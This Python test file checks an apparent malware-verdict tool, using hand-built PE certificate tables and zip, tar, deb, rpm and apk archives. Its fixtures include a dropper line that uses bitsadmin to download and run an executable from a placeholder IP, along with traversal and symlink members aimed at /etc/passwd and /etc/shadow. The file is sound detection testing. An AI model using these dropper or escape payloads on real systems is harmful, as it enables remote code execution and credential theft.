"""Coverage wave 5 tests: certificate-table content accounting
and the archive member-semantics gate.

Synthetic fixtures only, hand-built in this file (a small PE
builder with certificate-table support, zip and tar builders
with raw-header patching, and the wave 1 deb, rpm and apk
builders mirrored here). No sample was downloaded. See
validation/COVERAGE-WAVE-5-LOG.md for the diagnosis (prior
behaviour proven by probe), what was built, and the named
remainder.

Per item: a positive case that must cap with the reason named,
and a control that keeps its NO path.
"""
import gzip
import io
import os
import random
import stat
import struct
import sys
import tarfile
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero import verdict as verdict_mod
from event_zero.verdict import verdict
from event_zero.coverage3 import byte_ownership, certificate_table_accounting
from event_zero.coverage5 import (member_semantics, zip_member_semantics,
                                  tar_member_semantics,
                                  package_member_semantics)


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def blockers_text(v):
    return "\n".join(v.get("blockers") or []) + "\n" + \
        "\n".join(u for u in v.get("unaccounted") or [])


def _align(x, a):
    return (x + a - 1) // a * a


BENIGN = b"hello benign contents\n"
BENIGN_CMD = b"@echo off\r\necho hello\r\n"
DROPPER_CMD = (b"bitsadmin /transfer j http://198.51.100.9/p.exe "
               b"C:\\p.exe\r\nC:\\p.exe\r\n")
_random = random.Random(7)
PAYLOAD = bytes(_random.randrange(256) for _ in range(512))


# ======================================================================
# PE builder with a certificate table, DER and WIN_CERTIFICATE helpers
# ======================================================================

def build_pe_cert(cert_table=None):
    """A synthetic PE32+ with one .text section; when cert_table
    is given, the bytes are appended after the section and the
    certificate data directory (index 4) points at them."""
    opt_size = 240
    code = b"\x90" * 32 + b"\xc3" + b"\x00" * 29
    headers_end = 0x80 + 4 + 20 + opt_size + 40
    first_raw = _align(headers_end, 0x200)
    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, opt_size, 0x22)
    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, 0x20b)
    struct.pack_into("<I", opt, 16, 0x1000)
    struct.pack_into("<I", opt, 56, 0x2000)
    struct.pack_into("<I", opt, 60, first_raw)
    struct.pack_into("<H", opt, 68, 3)
    struct.pack_into("<I", opt, 108, 16)
    body = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt)
    sec = bytearray(40)
    sec[0:5] = b".text"
    struct.pack_into("<IIII", sec, 8, len(code), 0x1000, len(code),
                     first_raw)
    body += sec
    body = body.ljust(first_raw, b"\x00") + code
    if cert_table is not None:
        cert_off = len(body)
        struct.pack_into("<II", opt, 112 + 8 * 4, cert_off,
                         len(cert_table))
        body = body[:0x80 + 4 + 20] + bytes(opt) + \
            body[0x80 + 4 + 20 + opt_size:]
        body += cert_table
    return body


def der_blob(content_len, fill=0x41):
    """A minimal DER SEQUENCE of the given content length."""
    if content_len < 128:
        hdr = bytes([0x30, content_len])
    else:
        hdr = bytes([0x30, 0x82, (content_len >> 8) & 0xFF,
                     content_len & 0xFF])
    return hdr + bytes([fill]) * content_len


def win_cert(blob, declared_len=None, ctype=0x0002):
    ln = declared_len if declared_len is not None else 8 + len(blob)
    return struct.pack("<IHH", ln, 0x0200, ctype) + blob


def pad8(blob):
    return blob + b"\x00" * ((8 - len(blob) % 8) % 8)


CLEAN_TABLE = pad8(win_cert(der_blob(64)))
_first = win_cert(der_blob(64))
CHAINED_TABLE = pad8(_first + b"\x00" * ((8 - len(_first) % 8) % 8)
                     + win_cert(der_blob(48)))


# ======================================================================
# 1. Certificate-table content accounting
# ======================================================================

def test_cert_single_clean_entry_accounted():
    own = byte_ownership("a.exe", build_pe_cert(CLEAN_TABLE))
    assert own["complete"], own["material_unowned"]
    ct = own["certificate_table"]
    assert ct["accounted_entries"] == 1 and len(ct["entries"]) == 1


def test_cert_chained_entries_accounted():
    # Two legitimately chained certificates with zero alignment
    # padding: wave 3 owned only the first record and capped the
    # rest of the table; the chain walk accounts both.
    own = byte_ownership("a.exe", build_pe_cert(CHAINED_TABLE))
    assert own["complete"], own["material_unowned"]
    ct = own["certificate_table"]
    assert ct["accounted_entries"] == 2 and len(ct["entries"]) == 2


def test_cert_inflated_entry_length_hides_payload():
    # The Morphisec staging shape: the entry's declared length
    # covers the certificate and an encrypted-payload-shaped
    # blob appended inside the table after it.
    blob = der_blob(64)
    table = win_cert(blob + PAYLOAD,
                     declared_len=8 + len(blob) + len(PAYLOAD))
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    un = own["material_unowned"]
    assert len(un) == 1 and un[0]["size"] == len(PAYLOAD)
    assert "certificate" in un[0]["reason"]
    assert "high-entropy" in un[0]["reason"]
    assert "encrypted payload" in un[0]["reason"]


def test_cert_payload_past_der_content_inside_entry():
    # Accounting level: inside one entry, the DER structure
    # accounts exactly its own bytes; the payload riding inside
    # the same declared entry length is a separate unowned span
    # at the payload's own offset.
    blob = der_blob(64)
    table = win_cert(blob + PAYLOAD,
                     declared_len=8 + len(blob) + len(PAYLOAD))
    acct = certificate_table_accounting(table, 0, len(table))
    assert len(acct["entries"]) == 1
    assert acct["entries"][0]["accounted"]
    assert acct["entries"][0]["der_length"] == len(blob)
    un = [(s, e) for s, e, _r in acct["unowned"]]
    assert un == [(8 + len(blob), len(table))], un


def test_cert_payload_past_chain_caps():
    # Wave 3 behaviour kept: payload bytes sitting in the table
    # past an honestly sized certificate entry are unowned.
    table = pad8(win_cert(der_blob(64))) + PAYLOAD
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    assert any(u["size"] >= len(PAYLOAD) - 8
               for u in own["material_unowned"])


def test_cert_nonzero_padding_caps():
    good = win_cert(der_blob(64))
    table = good + b"\x01\x02\x03\x04" + win_cert(der_blob(48))
    table = pad8(table)
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    assert any("padding" in u["reason"]
               for u in own["material_unowned"])


def test_cert_malformed_chain_caps():
    table = win_cert(der_blob(64), declared_len=0)
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    assert any("malformed" in u["reason"]
               for u in own["material_unowned"])


def test_cert_executable_shaped_content_named():
    table = pad8(win_cert(der_blob(64))) + b"\xca\xfe\xba\xbe" + PAYLOAD
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    assert any("executable-shaped" in u["reason"]
               for u in own["material_unowned"])


def test_cert_unreadable_der_caps():
    table = win_cert(b"\xde\xad\xbe\xef" * 16)
    own = byte_ownership("a.exe", build_pe_cert(table))
    assert not own["complete"]
    assert any("DER" in u["reason"] for u in own["material_unowned"])


def test_verdict_clean_cert_table_keeps_no(tmp_path, monkeypatch):
    monkeypatch.setattr(
        verdict_mod, "pe_signature",
        lambda data: (True, True) if data[:2] == b"MZ" else (None, None))
    v = verdict(write(tmp_path, "signed.exe",
                      build_pe_cert(CHAINED_TABLE)))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)


def test_verdict_payload_in_cert_table_caps(tmp_path, monkeypatch):
    monkeypatch.setattr(
        verdict_mod, "pe_signature",
        lambda data: (True, True) if data[:2] == b"MZ" else (None, None))
    blob = der_blob(64)
    table = win_cert(blob + PAYLOAD,
                     declared_len=8 + len(blob) + len(PAYLOAD))
    v = verdict(write(tmp_path, "staged.exe", build_pe_cert(table)))
    assert v["headline"] != "NO: NO MALWARE"
    text = blockers_text(v)
    assert "byte-ownership" in text and "certificate" in text
    rec = [f for f in v["files"]
           if f["path_in_release"] == "staged.exe"][0]
    assert rec["byte_ownership"]["certificate_table"][
        "accounted_entries"] == 1


# ======================================================================
# 2. Archive member semantics: builders
# ======================================================================

def zip_bytes(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in members:
            z.writestr(name, data)
    return buf.getvalue()


def symlink_info(name):
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    return zi


def tar_bytes(members):
    """members: list of (TarInfo, data-or-None)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for ti, data in members:
            if data is None:
                tf.addfile(ti)
            else:
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def reg(name, data):
    return (tarfile.TarInfo(name), data)


def sym(name, target):
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.SYMTYPE
    ti.linkname = target
    return (ti, None)


def gate_kinds(divs):
    return {d["kind"] for d in divs}


def assert_caps(v, needle="member semantics"):
    assert v["headline"] != "NO: NO MALWARE", blockers_text(v)
    assert needle in blockers_text(v), blockers_text(v)


# ======================================================================
# 2a. ZIP semantics
# ======================================================================

def test_zip_ads_member_caps(tmp_path):
    data = zip_bytes([("notes.txt:payload.txt", BENIGN),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "stream-qualified-name" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "ads.zip", data)))


def test_zip_leading_colon_stream_member_caps(tmp_path):
    data = zip_bytes([(":Zone.Identifier", BENIGN),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "stream-qualified-name" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "stream.zip", data)))


def test_zip_backslash_traversal_caps(tmp_path):
    data = zip_bytes([("..\\..\\evil.txt", BENIGN),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "path-traversal-backslash" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "bs.zip", data)))


def test_zip_symlink_escape_caps(tmp_path):
    data = zip_bytes([(symlink_info("esc_link"), b"../../etc/passwd"),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "link-target-escapes" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "esc.zip", data)))


def test_zip_symlink_absolute_target_caps(tmp_path):
    data = zip_bytes([(symlink_info("abs_link"), b"/etc/passwd"),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "link-target-escapes" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "abs.zip", data)))


def test_zip_symlink_in_tree_keeps_no(tmp_path):
    data = zip_bytes([(symlink_info("ok_link"), b"readme.txt"),
                      ("readme.txt", BENIGN)])
    assert member_semantics(data, "zip") == []
    v = verdict(write(tmp_path, "ok.zip", data))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)


def test_zip_path_through_escaping_link_gate():
    data = zip_bytes([(symlink_info("link"), b"../../outside"),
                      ("link/evil.txt", BENIGN),
                      ("readme.txt", BENIGN)])
    divs = member_semantics(data, "zip")
    kinds = gate_kinds(divs)
    assert "link-target-escapes" in kinds
    assert "path-through-escaping-link" in kinds


def test_zip_duplicate_shadow_caps(tmp_path):
    # The dropper is the first member under the name and the
    # benign file the second: extraction writes the benign one,
    # and before the gate the shadowed dropper was never judged
    # and the archive reached NO.
    data = zip_bytes([("run.cmd", DROPPER_CMD),
                      ("run.cmd", BENIGN_CMD)])
    divs = member_semantics(data, "zip")
    assert "duplicate-member-name" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "dup.zip", data)))


def test_zip_duplicate_benign_members_still_caps(tmp_path):
    # The gate judges semantics, not intent: even two benign
    # members under one name diverge, because which one is the
    # written file depends on the extractor.
    data = zip_bytes([("a.txt", BENIGN), ("a.txt", BENIGN)])
    assert "duplicate-member-name" in gate_kinds(
        member_semantics(data, "zip"))
    assert_caps(verdict(write(tmp_path, "dupb.zip", data)))


def test_zip_case_collision_caps(tmp_path):
    data = zip_bytes([("Readme.txt", BENIGN), ("README.TXT", BENIGN)])
    divs = member_semantics(data, "zip")
    assert "written-form-collision" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "case.zip", data)))


def test_zip_local_header_size_divergence_caps(tmp_path):
    raw = bytearray(zip_bytes([("file.txt", BENIGN)]))
    pos = raw.find(b"PK\x03\x04")
    struct.pack_into("<I", raw, pos + 18, 999999)
    struct.pack_into("<I", raw, pos + 22, 888888)
    data = bytes(raw)
    divs = member_semantics(data, "zip")
    assert "local-central-size-divergence" in gate_kinds(divs)
    assert_caps(verdict(write(tmp_path, "lsize.zip", data)))


def test_zip_benign_nested_and_many_members_keep_no(tmp_path):
    members = [(f"a/b/c/file{i}.txt", BENIGN) for i in range(12)]
    members.append(("readme.txt", BENIGN))
    data = zip_bytes(members)
    assert member_semantics(data, "zip") == []
    v = verdict(write(tmp_path, "nested.zip", data))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)


def test_zip_record_carries_member_semantics(tmp_path):
    data = zip_bytes([("notes.txt:payload.txt", BENIGN),
                      ("readme.txt", BENIGN)])
    v = verdict(write(tmp_path, "ads.zip", data))
    rec = [f for f in v["files"]
           if f["path_in_release"] == "ads.zip"][0]
    assert rec["member_semantics"]["kind"] == "zip"
    assert rec["member_semantics"]["divergences"][0][
        "kind"] == "stream-qualified-name"


# ======================================================================
# 2b. TAR semantics
# ======================================================================

def test_tar_duplicate_shadow_caps(tmp_path):
    data = tar_bytes([reg("run.cmd", DROPPER_CMD),
                      reg("run.cmd", BENIGN_CMD)])
    assert "duplicate-member-name" in gate_kinds(
        member_semantics(data, "tar"))
    assert_caps(verdict(write(tmp_path, "dup.tar", data)))


def test_tar_ads_member_caps(tmp_path):
    data = tar_bytes([reg("notes.txt:payload.txt", BENIGN),
                      reg("readme.txt", BENIGN)])
    assert "stream-qualified-name" in gate_kinds(
        member_semantics(data, "tar"))
    assert_caps(verdict(write(tmp_path, "ads.tar", data)))


def test_tar_backslash_traversal_caps(tmp_path):
    data = tar_bytes([reg("..\\..\\evil.txt", BENIGN),
                      reg("readme.txt", BENIGN)])
    assert "path-traversal-backslash" in gate_kinds(
        member_semantics(data, "tar"))
    assert_caps(verdict(write(tmp_path, "bs.tar", data)))


def test_tar_symlink_escape_named_by_gate():
    data = tar_bytes([sym("esc_link", "../../etc/passwd"),
                      reg("readme.txt", BENIGN)])
    with tarfile.open(fileobj=io.BytesIO(data)) as tf:
        divs = tar_member_semantics(tf)
    assert "link-target-escapes" in gate_kinds(divs)


def test_tar_in_tree_symlink_clean_at_gate():
    # The gate finds no divergence in an in-tree symlink. (The
    # tar enumeration contract separately refuses link members
    # as unenumerable content, a stricter, earlier rule; the
    # gate's silence here is the semantics judgement.)
    data = tar_bytes([sym("ok_link", "readme.txt"),
                      reg("readme.txt", BENIGN)])
    with tarfile.open(fileobj=io.BytesIO(data)) as tf:
        divs = tar_member_semantics(tf)
    assert divs == []


def test_tar_benign_nested_keeps_no(tmp_path):
    data = tar_bytes([reg("a/b/c/deep.txt", BENIGN),
                      reg("readme.txt", BENIGN)])
    assert member_semantics(data, "tar") == []
    v = verdict(write(tmp_path, "nested.tar", data))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)


# ======================================================================
# 2c. Wave 1 package semantics (deb, rpm, apk)
# ======================================================================

def _tar_gz(members, mode="w:gz"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in members:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _ar_member(name, body):
    hdr = name.ljust(16) + "0".ljust(12) + "0".ljust(6) + "0".ljust(6)
    hdr += "100644".ljust(8) + str(len(body)).ljust(10) + "`\n"
    out = hdr.encode() + body
    if len(body) % 2:
        out += b"\n"
    return out


def make_deb_raw(data_tar_gz, control_tar_gz):
    out = b"!<arch>\n"
    out += _ar_member("debian-binary", b"2.0\n")
    out += _ar_member("control.tar.gz", control_tar_gz)
    out += _ar_member("data.tar.gz", data_tar_gz)
    return out


CTL_TAR = _tar_gz([("control", b"Package: probe\nVersion: 1.0\n")])


def test_deb_duplicate_member_caps(tmp_path):
    dat = _tar_gz([("usr/share/probe/run.sh", DROPPER_CMD),
                   ("usr/share/probe/run.sh", BENIGN_CMD),
                   ("usr/share/probe/hello.txt", BENIGN)])
    deb = make_deb_raw(dat, CTL_TAR)
    assert "duplicate-member-name" in gate_kinds(
        package_member_semantics(deb, "deb"))
    assert_caps(verdict(write(tmp_path, "dup.deb", deb)))


def _cpio_entry(name, data, mode=0o100644):
    nb = name.encode() + b"\x00"
    fields = [1, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(nb), 0]
    hdr = "070701" + "".join(f"{v:08x}" for v in fields)
    out = hdr.encode() + nb
    out += b"\x00" * ((4 - len(out) % 4) % 4)
    out += data
    out += b"\x00" * ((4 - len(data) % 4) % 4)
    return out


def _rpm_header(entries):
    store = bytearray()
    ents = []
    for tag, typ, val in entries:
        off = len(store)
        if typ == 6:
            store += val.encode() + b"\x00"
            ents.append((tag, typ, off, 1))
    out = bytearray(b"\x8e\xad\xe8\x01\x00\x00\x00\x00")
    out += struct.pack(">II", len(ents), len(store))
    for tag, typ, off, cnt in ents:
        out += struct.pack(">IIII", tag, typ, off, cnt)
    out += store
    return bytes(out)


def make_rpm_raw(cpio_entries):
    lead = bytearray(96)
    lead[0:4] = b"\xed\xab\xee\xdb"
    lead[4] = 3
    lead[10:20] = b"probe\x00".ljust(10, b"\x00")[:10]
    sig = _rpm_header([])
    main = _rpm_header([(1000, 6, "probe"), (1125, 6, "gzip")])
    cpio = b"".join(cpio_entries) + _cpio_entry("TRAILER!!!", b"",
                                                mode=0)
    out = bytes(lead) + sig
    out += b"\x00" * ((8 - len(out) % 8) % 8)
    out += main + gzip.compress(cpio)
    return out


def test_rpm_cpio_escaping_symlink_caps(tmp_path):
    # The member sits three components deep; four parent steps
    # climb above the install root the package is unpacked
    # into. Before the gate the cpio listing passed this member
    # by entirely and the package reached NO.
    rpm = make_rpm_raw([
        _cpio_entry("usr/share/probe/hello.txt", BENIGN),
        _cpio_entry("usr/lib/probe/link", b"../../../../etc/shadow",
                    mode=0o120777)])
    assert "link-target-escapes" in gate_kinds(
        package_member_semantics(rpm, "rpm"))
    assert_caps(verdict(write(tmp_path, "esc.rpm", rpm)))


def test_rpm_cpio_in_tree_symlink_keeps_no(tmp_path):
    rpm = make_rpm_raw([
        _cpio_entry("usr/share/probe/hello.txt", BENIGN),
        _cpio_entry("usr/lib/probe/link",
                    b"../../share/probe/hello.txt", mode=0o120777)])
    assert package_member_semantics(rpm, "rpm") == []
    v = verdict(write(tmp_path, "ok.rpm", rpm))
    assert v["headline"] == "NO: NO MALWARE", blockers_text(v)


def test_rpm_cpio_duplicate_member_caps(tmp_path):
    rpm = make_rpm_raw([
        _cpio_entry("usr/share/probe/run.sh", DROPPER_CMD),
        _cpio_entry("usr/share/probe/run.sh", BENIGN_CMD),
        _cpio_entry("usr/share/probe/hello.txt", BENIGN)])
    assert "duplicate-member-name" in gate_kinds(
        package_member_semantics(rpm, "rpm"))
    assert_caps(verdict(write(tmp_path, "dup.rpm", rpm)))


def make_apk_raw(data_tar_plain):
    sig = gzip.compress(_tar_gz([("sig.txt", b"sig\n")], "w:"))
    ctl = gzip.compress(_tar_gz([(".PKGINFO", b"pkgname = probe\n")],
                                "w:"))
    dat = gzip.compress(data_tar_plain)
    return sig + ctl + dat


def test_apk_duplicate_member_caps(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, data in [("usr/share/probe/run.sh", DROPPER_CMD),
                           ("usr/share/probe/run.sh", BENIGN_CMD),
                           ("usr/share/probe/hello.txt", BENIGN)]:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    apk = make_apk_raw(buf.getvalue())
    assert "duplicate-member-name" in gate_kinds(
        package_member_semantics(apk, "apk"))
    assert_caps(verdict(write(tmp_path, "dup.apk", apk)))
